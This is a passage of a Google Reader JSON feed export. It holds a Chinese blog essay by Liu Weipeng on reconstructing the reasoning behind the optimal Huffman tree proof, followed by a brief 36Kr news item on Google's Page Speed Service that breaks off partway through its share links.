f2d1，简单变换一下就得到结论：f1(d1-d2)&lt;f2(d1-d2)，也就是说如果d1&lt;d2，那么f1必然&gt;f2，如果d1&gt;d2，那么f1必然&lt;f2。换言之就是<em>叶子节点的深度越高，频率必须越低</em>，否则就不可能是最优霍夫曼树。那么，之前我们觉得不那么显然的结论便呼之欲出了：频率最低的叶子节点必然位于树的最底层，频率最高的叶子节点必然位于树的最高层。</p>\n<p>有了这个结论之后，我们便能够对最优霍夫曼树的构建走出确定性的一步，即，将频率最低的两个叶子节点放在最底层。别小看这一步，这一步已经排除了大量的可能性。这里，我们容易一开始天真地觉得最底层只有这两个叶子节点，于是它们拥有共同父节点，<em>这样一来霍夫曼树的整个拼图便已经拼好了一个小小的角落</em>。</p>\n<p>然后我们会发现，要是它们不是兄弟怎么办呢？这里提到另一个一般原则——<strong>归约</strong>。不是兄弟的情况能否归约为是兄弟的情况？反正我们要求的是<em>一个</em>最优解，而不是<em>所有的</em>最优解，我们只需证明，如果当这两个最低频率的叶子不是兄弟的时候的确存在着某棵最优霍夫曼树，那么通过交换它们各自的兄弟，从而让这两个叶子团聚之后，修改后的树仍然是最优的就可以了。事实情况也的确如此，证明非常直接——既然这里涉及到的所有4个节点都在最底层同一个高度上，那么互相交换的时候不会改变他们任何一个人的深度值，所以总cost不会改变。</p>\n<p>但是接下来我们犯了难，整个树的一个小小的樱桃状的局部是确定下来了，接下来怎么办呢？一个最自然的思路就是考虑第三小的叶子，因为前面说了，元素频率越低就越位于树的底部嘛。第三小的叶子有两种可能的归属，一是跟最小的两个叶子同样位于最底层（这不会违反我们前面得到的推论），这个时候第三小的叶子的兄弟叶子肯定是第四小的叶子，如下图：</p>\n<p><a href=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree3.jpg\"><img style=\"background-image:none;border-right-width:0px;margin:5px 0px 10px;padding-left:0px;padding-right:0px;display:inline;border-top-width:0px;border-bottom-width:0px;border-left-width:0px;padding-top:0px\" title=\"tree3\" border=\"0\" alt=\"tree3\" src=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree3_thumb.jpg\" width=\"244\" height=\"106\"></a></p>\n<p>另一种归属就是往上一层去（注意，一旦第三小的叶子往上去了一层，那么剩下的所有叶子都必须至少在这个层以上），往上一层去了之后，它的兄弟是谁呢？不妨将它和刚才第一第二叶子的父节点结为兄弟（前面证明过，同层之前节点互换不会改变编码的cost），如下图：</p>\n<p><a href=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree5.jpg\"><img style=\"background-image:none;border-right-width:0px;margin:5px 0px 10px;padding-left:0px;padding-right:0px;display:inline;border-top-width:0px;border-bottom-width:0px;border-left-width:0px;padding-top:0px\" title=\"tree5\" border=\"0\" alt=\"tree5\" src=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree5_thumb.jpg\" width=\"181\" height=\"244\"></a></p>\n<p>可是现在问题出现了：虽然第一步构建（最小的两个叶子）是确定的，但是到了第二步摆在我们面前的就有两个选择了，到底选择哪个呢？一个办法就是把两种选择都记下来，然后继续往下走。可是别小看两种选择，接下去每一步都有两种选择的话就变成指数复杂度了。所以现在我们便有了动机<em>回头看一看</em>，<em>看问题中是否有什么没有发现的性质能够帮助我们再排除掉其中一个选择</em>。理想情况下如果每一步都是必然的，确定的，那么N步我们就可以构建出整棵树，这是我们希望看到的，抱着这个良好的愿望，我们仔细观察上面两种构型，一个自然而然的问题是：这两种构型都有潜质成为最优解吗？如果我们能够证明其中一种构型不能成为最优解那该多好？就省事多了嘛。这里引入另一个一般性的解题法则：<strong>特例</strong>。我们的<strong>大脑喜欢具体的东西，在特例中折腾和观察会方便的多</strong>。</p>\n<p>上面这个{1, 2, 3, 4}的例子就是个很好的特例，如图（注：图中节点旁的数字一概为<em>频率值，</em>而非编号）：</p>\n<p><a href=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree31.jpg\"><img style=\"background-image:none;border-right-width:0px;margin:5px 0px 10px;padding-left:0px;padding-right:0px;display:inline;border-top-width:0px;border-bottom-width:0px;border-left-width:0px;padding-top:0px\" title=\"tree3\" border=\"0\" alt=\"tree3\" src=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree3_thumb1.jpg\" width=\"277\" height=\"126\"></a></p>\n<p>多加折腾一番<em>也许</em>我们不难发现，如果将1，2及其父节点跟叶子4进行交换（注意：<em>交换的时候1，2也被一同带走了</em>，因为反正1，2两个节点已确定是好兄弟永远不会分家了，折腾的时候只能作为一个整体移动，所以这里也可以说是<strong>交换子树</strong>），那么树的编码将会变得更优，因为这样一次交换会将1和2的深度+1，意味着整棵树的代价+3，而同时会将叶子4的深度-1，也就是说整棵树的代价-4，总体上整棵树的代价就是+3-4=-1（注意，在计算的时候我们只需考虑被交换的局部，因为树的其他部分的代价保持不变）。如下图：</p>\n<p><a href=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree4.jpg\"><img style=\"background-image:none;border-right-width:0px;margin:5px 0px 10px;padding-left:0px;padding-right:0px;display:inline;border-top-width:0px;border-bottom-width:0px;border-left-width:0px;padding-top:0px\" title=\"tree4\" border=\"0\" alt=\"tree4\" src=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree4_thumb.jpg\" width=\"244\" height=\"227\"></a></p>\n<p>这个交换启发了我们，其实前面一开始说的交换两个叶子节点<em>可以推广为交换内部节点和叶子节点</em>，然后很快我们就会意识到其实可以推广到交换任意两个节点。（注意，<em>当我们说交换内部节点的时候，其实是连同该内部节点作为局部根节点的整个子树都交换过去</em>）于是前面我们的推论就可以推广为：</p>\n<ul>\n<li><em>在最优霍夫曼树中，无论互换哪两个节点，得到的树都变得更“差”（交换内部节点则是连同该内部节点作为局部根的子树一同带走）</em> </li>\n</ul>\n<p>这个推论很容易理解，只不过是多增加了一种“编辑”最优霍夫曼树的方法罢了（记住<em>最优霍夫曼树无论怎么“编辑”都不会变得更“好”，包括“交换子树”这种“编辑”</em>），我们前面没有想到这种“编辑”方法是因为它不那么显然，而且当时我们已经想到一种最直接的“编辑”方法了，即交换叶子，就容易顺着那个思路一直走下去，直到我们发现必须寻找新的性质，才回过头来看看有没有其他法子。</p>\n<p>当然，并不排除一开始就想到这种推广的可能性，问题求解的过程并不是这么线性的，如果我们习惯了推而广之的思维，也许一下就能想到这个推广来。类似的，也不排除从另一种思路出发想到这种推广的可能性。所以这里只是可能的思维轨迹中的一种，重点在于其中并没有某处忽然出现一个不知从哪里冒出来的，神启一般的结论。</p>\n<p>刚才提到，构造最优树的第二步是考虑第三小的叶子，但也有另一种常见的思维：考虑到第一步（即选取频率最小的两个叶子）所做的事情是从N个叶子中选择两个黏在一起作为兄弟，那么也许对于一些人来说自然而然的第二步就是试图继续选取两个节点黏在一起作为兄弟（注意这里不仅可以选择叶子，也可以选择已经生成的内部节点），然后依次类推来拼完整棵树。按照这一思路，第二步的选项仍然还是集中在第三小的叶子上，因为这个选择要么是让第三第四小的叶子结拜为兄弟，要么是让最小两个叶子的父节点和第三小的叶子结拜。</p>\n<p>回到刚才我们的推论：在最优霍夫曼树中，无论互换哪两个节点，得到的树都变得更“差”（交换内部节点则是连同该内部节点作为局部根的子树一同带走） 。根据这个推论我们容易计算出，<em>在最优霍夫曼树当中，两个内部节点n1和n2，如果n1比n2更深，那么n1下面的所有叶子的频率之和必然要小于n2下面所有叶子的频率之和</em>。如果交换的是一个内部节点和一个叶子节点，则道理是类似的。这个性质的证明和上面的类似，就不赘述了。</p>\n<p>这个性质暗示了一个重要的推广结论：<em>如果我们把每个内部节点的所有叶子的频率之和标在它旁边，那么整棵树的每个节点便都有了一个数值，这个数值遵循统一的规律：即越往深层越小</em>。这就意味着，我们刚才的二选一困境有办法了！当我们将最小的两个叶子f1和f2合并的时候，生成了一个新的节点M，这个节点有一个数字（为两个叶子的频率之和f1+f2），根据上面的推论，<em>这个数字f1+f2跟所有频率一同，遵循最小的在最底层的原则</em>，所以我们下一步必须在剩下的那些互相之间关系待确定的节点（叶子节点和内部节点）之中，即{(f1 + f2), f3, f4}里面选择最小的两个数字结合成兄弟（由于f1和f2这两个节点已经铁板钉钉结为整体了，所以从集合里面可以看做移除）。到这里，我们就发现递归已经出现了，接下去的过程对于绝大多数人应该就真的很显然了。</p>\n<p>以上的解释，比《Algorithms》更简短吗？显然不是。反而要长得多（其实真正的思维过程比这要更长，因为中间还会涉及各种不成功的尝试）。但是它比《Algorithms》当中的版本更不容易被忘记，因为其中关键的思维拐点并不是毫无来由的，而是从你已经熟知的，或者说虽然不知道，但容易理解的一般性解题法则出发自然推导出来的，所以你基本上不需要记忆什么东西，因为你需要记的已经在你脑海中了。</p>\n<p>在上面的证明过程中，还有一个不像看上去那么显然的事情：在我们寻找最优霍夫曼树的时候，我们曾经试图去比较假想的最优树和它的“临近”的树，从而去探索最优树的性质。但是，究竟什么是临近的树？在前面的讲解中，我们说如果交换A和B这两个叶子节点，便得到一颗不同的树，可以看做和原树的“编辑距离”为1的树。但是，真的这么显然么？难道除了交换叶子的位置，就没有其他办法去“折腾”这棵树了？后来我们看到，可以<em>交换子树</em>而不仅仅是叶子，而交换子树让我们得到了至关重要的推论。此外，如果不是交换，而是像AVL树那样“旋转”呢？说到底，二叉树是一个离散的东西，并不像连续值那样，天生就有“距离”这个概念，如果我们离散而孤立地去看待所有的树，那么没有什么临近不临近的，临近本是一个距离的概念，除非我们定义树和树之间的距离函数，才能说临近与否，而距离函数怎么定义才是“显然”的呢？</p>\n<p>还有，其实以上只是试图给出最优霍夫曼树的<em>证明</em>的一个更自然的过程，而<em>当年霍夫曼面临这个问题的时候根本还没有人想到要用二叉树呢！更不要说在二叉树的前提之下进行证明了</em>。根据wikipedia的介绍，霍夫曼同学（当年还在读Ph.D，所以的确是“同学”，而这个问题是坑爹的导师Robert M. Fano<a href=\"http://www.huffmancoding.com/my-family/my-uncle\">给他们作为大作业的</a>，Fano自己和Shannon合作给出了一个suboptimal的编码方案，为得不到optimal的方案而寝食难安，情急之下便死马当活马医扔给他的学生们了）当年为这个问题憔悴了一个学期，最后就快到deadline的时候“忽然”想到二叉树这个等价模型，然后在这个模型下三下五除二就搞定了一篇流芳千古的论文，超越了其导师。</p>\n<p>最后说两个有趣的现象：也许很多人会觉得，越是大师来写入门教科书越是好，其实很多时候并非如此，尤其是在算法设计和数学领域，往往越是在其中浸淫久了越是难写出贴近初学者的书，因为大量对初学者来说一点都不显然的事情在他看来已经是“不假思索”了，成了他的内隐记忆，尤其是当他想要和你解释一个复杂的东西的时候你就会发现他会常常逻辑跳跃，满嘴跑术语，根本没有意识到别人对有些术语和隐含的逻辑根本没有像他那样的理解。</p>\n<p><strong>最适合将一个东西讲给别人听的时候并不是等懂了很多年以后，而是刚刚弄懂的时候</strong>，这个时候从不懂到懂的差别记忆还非常鲜明，能够清清楚楚地记得到底是哪些关键的地方是最折磨人的，也最能够站在不懂者的角度来思考问题。像波利亚这样，成了大师还能够站在不懂者角度去换位思考的，可以说是凤毛麟角。所以说前Amazon CAO（首席算法官）的<a href=\"http://www.amazon.com/Introduction-Algorithms-Creative-Udi-Manber/dp/0201120372/\">《Introduction to Algorithms: a Creative Approach》</a>绝对是本罕见的好算法书）</p>\n<p><a href=\"http://mindhacks.cn/2008/07/07/the-importance-of-knowing-why/\">知其所以然（一）</a>里面曾经提到，要弄清来龙去脉，最好去看看原始作者是怎么想的，可是正如上文所说，即便是最初的发明者，在讲述的时候也会有意无意地“线性化”，我就去查看了霍夫曼最初的论文，那叫一个费解，不信你可以自己看看(<a href=\"http://compression.ru/download/articles/huff/huffman_1952_minimum-redundancy-codes.pdf\">PDF</a>)。</p>\n<p>可以归约为搜索算法的问题（非常多）一般来说相对还是有一些头绪的，因为搜索空间一般还比较容易界定，难点在于要从问题的条件中推导出用于节省搜索的性质。而策略设计问题则完全是另一个世界，因为策略的设计空间貌似是可列无穷的，常常让人感觉无从下手，摸不着头绪，许多让人挠头的智力问题就有这个特点（例如著名的100个囚徒和1个灯泡的房间就让很多人有这种感觉），策略设计问题也有一些较通用的法则，以后再说。</p>\n<p>怎么才能在学算法的时候学到背后的东西呢？有以下几点很重要：</p>\n<ol>\n<li><strong>不要觉得每个步骤都很显然</strong>，每个nontrivial的算法背后都有一段艰辛的探索经历，觉得显然的话必然是一种幻觉。<strong>Stay foolish</strong>，才能发现某些环节其实并不是那么显然的。 </li>\n<li>检验是否真正理解的最佳方法就是<strong>过一段时间之后，自己试着证明一次</strong>。如果真正理解了的话，你的证明便会比较顺畅。如果当时没有真正理解，那么凡是那些你当时觉得显然但其实不显然的地方，都会成为你证明里面缺失的环节。 </li>\n<li>对于一个算法，<strong>多寻找各种来源的资料</strong>，也许能够找到一个讲的比较深刻的。我在<a href=\"http://mindhacks.cn/2008/06/13/why-is-quicksort-so-quick/\">《数学之美番外篇：快排为什么那么快》</a>和<a href=\"http://mindhacks.cn/2008/07/07/the-importance-of-knowing-why/\">《知其所以然（一）》</a>里面都举到了这样的例子。 </li>\n<li><strong>多试着去抽象背后的一般性法则</strong>，即便后来发现抽象得是错的，也比不去抽象要好。<a href=\"http://mindhacks.cn/2009/03/28/effective-learning-and-memorization/\">抽象是推广的基础</a>。只有抽象出更深层的法则，才能让你事半功倍，触类旁通，否则一个萝卜永远是一个坑。（注意，其实我们的下意识是会进行一定程度的抽象的，例如前面提到的原始人的例子，小溪和小河（或者小沟）细节上是不同的，但本质上是一样的，我们的大脑会自动进行这种简单抽象，提出事物的共性。正因此，即便你不去有意识地总结一般规律，只要你看的足够多，练的足够多，必然就会越来越谙熟。） </li>\n</ol>\n<p>最后留个问题：虽然按照上文的方式来构造霍夫曼树一定能够得到<em>一个</em>最优树，但是怎么证明一定能得到呢？乍一看这个问题似乎很多余，因为证明很简单：我们拼装整棵树的每一步都没得选，而且每一步都必然拼凑出最优树的一个小小局部，如果最终还没有得到最优树的话，只能说最优树是不存在的了，然而最优树是一定存在的，因为所有树的集合是有穷的，有穷集必有最值，因此证毕。这个证明固然是没问题的，但它其实是一个间接证明，换句话说，我们在构建树的过程中的逻辑是这样的：“之所以我们选择粘结n1和n2，是因为其他粘法必然违反最优树的两个性质。所以我们别无选择。”但是，这并没有说，我们选择了粘结n1和n2，一定就<em>符合</em>了最优树的性质。（也就是说“其他做法都是错”并不能推出“这种做法必然对”，这就像是你在一大堆豆子当中寻找一个特殊的豆子，你拿起一个，看看不是，扔掉，又拿起一个，还不是，扔掉，排除到最后只剩一个豆子了，假设你又知道这个特殊的豆子必然存在，那么这个时候你根本不用看就知道这个豆子一定就是你要找的）那么，你能否直接证明，拼装最优树的过程每一步都<em>符合</em>最优树的性质呢？</p>\n<hr>\n<p>P.S.</p>\n<p>[1] 《逃出你的肖申克》和《BetterExplained》是我喜欢的两个系列，还会继续写，我有很多问题，也在Evernote里面记了不少零碎的思考和资料，但只有当我觉得理解的足够深入，系统，以及手头有足够的有意思和有说服力的例子的时候，我才会把整条线串起来成文，所以这事慢慢来不着急，反正这个博客也不会关掉。</p>\n<p>[2] 工作之后可用业余时间急剧减少，已经陆续基本把GReader砍掉了，时间再往前推，砍掉邮件列表，再往前是Twitter，再往前是BBS。现在基本就只剩邮件了。越来越发现当时间有限的时候，看书比看网要有效得多，也不会那么信息焦虑，网络上的那些消息当中真正重要的会自己来找你，不用每天去刷屏。不过有个例外，我过一阵子就会去逛一下Amazon的个性化推荐项目。如果你已经工作，苦于时间有限，我建议你这么做。最近看过的几本值得好好推荐的书有：《Number Sense》，《Reading in the Brain》，《The Vision Revolution》，《The Tell-Tale Brain》，《Kluge》。</p>\n<p>[3] 顺便吐槽国内出版社引进Pop Science类书籍的效率和质量，就我观察，台湾引进Pop Science类书籍需要延迟两年左右，大陆则从三四年到无限期不等（某种程度上，一个国家的出版方的认识水平，决定了这个国家大众的认识水平。你去看下我在豆瓣的书单就知道有多少好书与国内读者失之交臂了），例如《Number Sense》这本好书，到现在还没有引进，99年出版的书啊。《Kluge》更是译为《乱乱脑》这种坑爹的书名，封面搞得跟少儿读物一样。《Reading in the Brain》引入的算较快的，但也延迟了一年半了，而且翻译质量也不是很上乘（算是不功不过吧），说到这里要赞中信出版社，最近一年引入了很多给力的Pop Science畅销书，眼光还算不错。最近在Amazon上搜一些好的发展心理学的书，通过Amazon的推荐引擎看到了<a href=\"http://www.amazon.com/Pink-Brain-Blue-Differences-Troublesome/dp/0618393110\">《Pink Brain，Blue Brain》</a>，这本受到因研究大脑记忆的分子机制而获诺奖的Eric Kandel盛赞的科普09年就出了，到现在国内影子都见不着，还好在卓越上买到了原版。虽然基本还没开始看，但可以郑重推荐给初为父母的同学们:)</p>\n<h3>你可能也会喜欢以下文章</h3><ul><li><a href=\"http://mindhacks.cn/2010/11/14/the-importance-of-knowing-why-part2/\" title=\"知其所以然（续）\">知其所以然（续）</a> (53)</li><li><a href=\"http://mindhacks.cn/2008/07/07/the-importance-of-knowing-why/\" title=\"知其所以然（以算法学习为例）\">知其所以然（以算法学习为例）</a> (45)</li><li><a href=\"http://mindhacks.cn/2008/06/13/why-is-quicksort-so-quick/\" title=\"数学之美番外篇：快排为什么那样快\">数学之美番外篇：快排为什么那样快</a> (40)</li><li><a href=\"http://mindhacks.cn/2008/04/18/learning-from-polya/\" title=\"跟波利亚学解题(rev#3)\">跟波利亚学解题(rev#3)</a> (30)</li><li><a href=\"http://mindhacks.cn/2007/12/02/probability-theory-in-evolution/\" title=\"数学之美番外篇：进化论中的概率论\">数学之美番外篇：进化论中的概率论</a> (15)</li></ul><hr>\n<h3>订阅 Mind Hacks</h3>\n<a title=\"用Google Reader订阅\" href=\"http://fusion.google.com/add?feedurl=http://mindhacks.cn/feed/\"><img src=\"http://mindhacks.cn/wp-content/uploads/2009/02/feed_google.gif\" style=\"border:0\" alt=\"订阅到 | Google\"></a> \n<a title=\"用鲜果订阅\" href=\"http://www.xianguo.com/subscribe.php?url=http://mindhacks.cn/feed/\"><img src=\"http://mindhacks.cn/wp-content/uploads/2009/02/feed_xianguo.gif\" style=\"border:0\" alt=\"订阅到 | 鲜果\"></a>\n<br> \n<a title=\"用抓虾订阅\" href=\"http://www.zhuaxia.com/add_channel.php?url=http://mindhacks.cn/feed/\"><img src=\"http://mindhacks.cn/wp-content/uploads/2009/02/feed_zhuaxia.gif\" style=\"border:0\" alt=\"订阅到 | 抓虾\"></a> \n<a title=\"用有道订阅\" href=\"http://reader.youdao.com/b.do?keyfrom=mindhacks&amp;url=http://mindhacks.cn/feed/\"><img src=\"http://mindhacks.cn/wp-content/uploads/2009/02/feed_yodao1.gif\" style=\"border:0\" alt=\"订阅到 | 有道\"></a> \n<hr>\n<h3>我是你的信息过滤器</h3>\n想了解作者最近在关注什么，欢迎 Follow <a href=\"http://weibo.com/pongba\">刘未鹏pongba@微博</a>\n<br>\n程序员朋友请到作者发起的 <a href=\"https://groups.google.com/group/pongba\">TopLanguage</a> (<a href=\"http://mindhacks.cn/about-toplanguage/\">about</a>) 社群逛逛，定有收获 :)\n<br>\n想了解作者在阅读哪些书，请到 <a href=\"http://www.douban.com/people/pongba/\">pongba@豆瓣</a>，或者直接访问以下四个豆列：<a href=\"http://www.douban.com/doulist/46003/\">[只读经典]思维改变生活</a> | <a href=\"http://www.douban.com/doulist/127649/\">[只读经典]思考的技术与艺术</a> | <a href=\"http://www.douban.com/doulist/197706/\">决策与判断</a> | <a href=\"http://www.douban.com/doulist/176513/\">机器学习与人工智能书籍资源导引</a> 。\n<hr>\n<p><small>\n本文由 刘未鹏 发布在 <a href=\"http://mindhacks.cn\">刘未鹏 | Mind Hacks</a>, 2011. | <a href=\"http://mindhacks.cn/2011/07/10/the-importance-of-knowing-why-part3/#commenting\">72 条评论</a> | 标签: <a href=\"http://mindhacks.cn/tags/%e7%ae%97%e6%b3%95/\" rel=\"tag\">算法</a>\n<br>\n转载请注明作者，出处，以及<a href=\"http://mindhacks.cn/2011/07/10/the-importance-of-knowing-why-part3/\">原始超链接</a>: http://mindhacks.cn/2011/07/10/the-importance-of-knowing-why-part3/\n</small></p>"
    },
    "author" : "刘未鹏",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://mindhacks.cn/feed/",
      "title" : "刘未鹏 | Mind Hacks",
      "htmlUrl" : "http://mindhacks.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312026388115",
    "timestampUsec" : "1312026388115741",
    "id" : "tag:google.com,2005:reader/item/6a78a696e1c2f43f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "工具", "Google", "页面加速服务" ],
    "title" : "Google推出免费的【页面加速服务】，让你的网站越来越快",
    "published" : 1311864395,
    "updated" : 1311864395,
    "alternate" : [ {
      "href" : "http://www.36kr.com/google-page-speed-service/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img src=\"http://www.36kr.com/wp-content/uploads/2011/07/pagespeed-100.png\" alt=\"\">想让你的网站访问速度更快吗？Google可以帮你做到，而且免费。</p>\n<p>Google刚刚推出了一个免费页面加速服务（<a href=\"http://code.google.com/speed/pss/index.html\">Page Speed Service</a>），不仅可以让你使用Google的代理服务器，而且还可以帮你优化网站代码。你只需把网站的DNS指向Google的DNS，然后该服务就会自动抓取你的页面，然后根据最佳惯例进行优化，并通过Google的缓存代理网络向全世界提供网页访问服务。</p>\n<p>为了对比优化前后的效果，Google还提供了一个<a href=\"https://code.google.com/speed/pss/docs/tryit.html\">测速页面</a>，输入你的网址后，Google就会对网站代码进行优化，然后进行对比测试。测试基准为IE8，采用的服务是<a href=\"http://www.webpagetest.org/\">WebPagetest</a>。</p>\n<p><a href=\"http://code.google.com/intl/zh-CN/speed/pss/gallery.html\">对比结果展示页面</a>显示很多网站经过优化后访问速度可大幅提升，有的高达60-70%。</p>\n<p>以下是36氪的测试结果，我们可以看到经过优化以后页面加载时间从12.4秒减少到9.2秒。</p>\n<p><img src=\"http://www.36kr.com/wp-content/uploads/2011/07/7ChQ.png\" alt=\"\">由于目前申请测试的人比较多，你需要排队。不过你可以先<a href=\"http://code.google.com/intl/zh-CN/speed/pss/index.html\">注册一个账户</a>，然后端杯茶水慢慢等。欢迎把你的测试结果拿出来晒晒。</p>\n\n除非注明，本站文章均为原创或编译，转载请注明： 文章来自<a href=\"http://www.36kr.com/google-page-speed-service/\">36氪</a>\n<br>\n\n\n\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=tsina&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB%20%7C@36%E6%B0%AA&amp;uid=1522335&amp;appkey=595885820\" title=\"新浪微博\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/sina.png\" title=\"新浪微博\" alt=\"新浪微博\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=tqq&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB%20%7C@wow36kr&amp;uid=1522335&amp;appkey=d95b0367fe8d4506abef59df28ef528b\" title=\"腾讯微博\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/tqq.png\" title=\"腾讯微博\" alt=\"腾讯微博\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=qzone&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"QQ空间\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/qqzone.png\" title=\"QQ空间\" alt=\"QQ空间\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=renren&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"人人\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/renren.png\" title=\"人人\" alt=\"人人\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=douban9dian&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"九点\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/douban.png\" title=\"九点\" alt=\"九点\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=kaixin001&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"开心\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/kaixin.png\" title=\"开心\" alt=\"开心\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=t163&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=K7mBm0lZSura5fdA\" title=\"网易微博\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/t163.png\" title=\"网易微博\" alt=\"网易微博\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=xiaoyou&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"腾讯朋友\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/xiaoyou.png\" title=\"腾讯朋友\" alt=\"腾讯朋友\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=tsohu&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"搜狐微博\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/sohu.png\" title=\"搜狐微博\" alt=\"搜狐微博\"></a>\n\t<a rel=\"nofollow\" 